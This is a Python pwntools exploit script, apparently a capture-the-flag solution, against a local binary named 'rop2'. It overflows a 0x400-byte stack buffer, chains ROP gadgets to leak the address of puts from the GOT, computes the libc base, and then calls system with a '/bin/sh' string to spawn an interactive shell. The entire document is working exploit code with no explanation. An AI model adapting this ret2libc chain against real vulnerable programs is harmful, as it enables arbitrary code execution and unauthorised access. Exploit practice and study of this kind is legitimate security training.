from pwn import *

e = ELF("./rop2")
libc = e.libc
p = process("./rop2")

pop_rdi = 0x00401283
puts_plt = 0x401060
puts_got = 0x404018
main = 0x4011cf
ret_gadget = 0x40101a

payload = b'A'*0x400        #buf
payload += b'B'*8           #sfp
payload += p64(ret_gadget)
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)

p.recvuntil(b"buf:\n")
p.send(payload)

puts_addr = u64(p.recvline().strip().ljust(8, b"\x00"))
log.info("puts_addr: " + hex(puts_addr))

libc_base = puts_addr - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
binsh =0x402004

payload = b'A'*0x400        #buf
payload += b'B'*8           #sfp
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system_addr)

p.send(payload)

p.interactive()